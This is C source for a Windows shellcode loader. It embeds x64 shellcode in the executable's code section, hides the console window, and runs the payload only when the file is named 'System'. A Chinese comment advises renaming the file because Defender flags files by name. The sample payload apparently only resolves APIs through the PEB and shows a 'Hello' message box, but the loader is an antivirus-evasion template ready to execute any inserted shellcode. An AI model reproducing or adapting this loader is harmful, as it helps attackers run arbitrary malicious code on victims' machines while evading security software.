#include <Windows.h>
#include <tchar.h>


/*
* 注意事项：
*
* 1. 经多次测试发现，Defender有根据名称判断文件是否恶意的倾向，因此使用前务必将文件名修改
*
*/


#ifndef _DEBUG
#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
#endif // _DEBUG

#pragma section(".text")

__declspec(allocate(".text")) BYTE Shellcode[] = {
	0xeb,0x2e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // 这行的作用是直接JMP跳转到入口点 JMP $+0x30
	0x55,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x00,0x48,0x65,0x6c,0x6c,0x6f,0x00,0x00,0x00,
	0x48,0x83,0xec,0x28,0x65,0x48,0x8b,0x04,0x25,0x30,0x00,0x00,0x00,0x48,0x8b,0x48,
	0x60,0x48,0x8b,0x41,0x18,0x4c,0x8b,0x40,0x20,0x49,0x8b,0xc8,0x48,0x8b,0x09,0x41,
	0xb9,0xdf,0xff,0x00,0x00,0x48,0x8b,0x51,0x40,0x0f,0xb7,0x42,0x28,0x66,0x83,0xe8,
	0x4b,0x66,0x41,0x85,0xc1,0x75,0x0e,0x66,0x83,0x7a,0x34,0x33,0x75,0x07,0x66,0x83,
	0x7a,0x36,0x32,0x74,0x41,0x49,0x3b,0xc8,0x75,0xd2,0x33,0xc9,0xba,0x76,0x2c,0x1d,
	0x07,0xe8,0x3e,0x00,0x00,0x00,0x48,0x8d,0x0d,0x83,0xff,0xff,0xff,0xff,0xd0,0xba,
	0xcf,0x4c,0xe5,0x4c,0x48,0x8b,0xc8,0xe8,0x28,0x00,0x00,0x00,0x45,0x33,0xc9,0x4c,
	0x8d,0x05,0x7a,0xff,0xff,0xff,0x48,0x8d,0x15,0x7b,0xff,0xff,0xff,0x33,0xc9,0x48,
	0x83,0xc4,0x28,0x48,0xff,0xe0,0x48,0x8b,0x49,0x20,0xeb,0xc0,0xcc,0xcc,0xcc,0xcc,
	0xcc,0xcc,0xcc,0xcc,0x48,0x89,0x74,0x24,0x08,0x48,0x89,0x7c,0x24,0x10,0x48,0x63,
	0x41,0x3c,0x4c,0x8b,0xc1,0x8b,0xf2,0x44,0x8b,0x94,0x08,0x88,0x00,0x00,0x00,0x4c,
	0x03,0xd1,0x45,0x8b,0x4a,0x20,0x41,0x8b,0x7a,0x1c,0x4c,0x03,0xc9,0x48,0x03,0xf9,
	0x33,0xc9,0x41,0x3b,0x4a,0x18,0x73,0x33,0x41,0x8b,0x11,0x49,0x03,0xd0,0x45,0x33,
	0xdb,0xeb,0x0d,0x45,0x6b,0xdb,0x21,0x0f,0xbe,0xc0,0x44,0x03,0xd8,0x48,0xff,0xc2,
	0x8a,0x02,0x84,0xc0,0x75,0xed,0x44,0x3b,0xde,0x74,0x0c,0xff,0xc1,0x49,0x83,0xc1,
	0x04,0x41,0x3b,0x4a,0x18,0x72,0xd1,0x41,0x3b,0x4a,0x18,0x74,0x15,0x8b,0xd1,0x41,
	0x8b,0x4a,0x24,0x49,0x03,0xc8,0x0f,0xb7,0x04,0x51,0x8b,0x04,0x87,0x49,0x03,0xc0,
	0xeb,0x02,0x33,0xc0,0x48,0x8b,0x74,0x24,0x08,0x48,0x8b,0x7c,0x24,0x10,0xc3
};

int _tmain(int argc, TCHAR* argv[])
{
	TCHAR FileName[MAX_PATH];
	_tsplitpath_s(argv[0], NULL, 0, NULL, 0, FileName, sizeof(FileName), NULL, 0);

	if (_tcsicmp(FileName, _T("System")) != 0)
		return 0;

	return (*(int(*)())(&Shellcode[0x0]))();
}
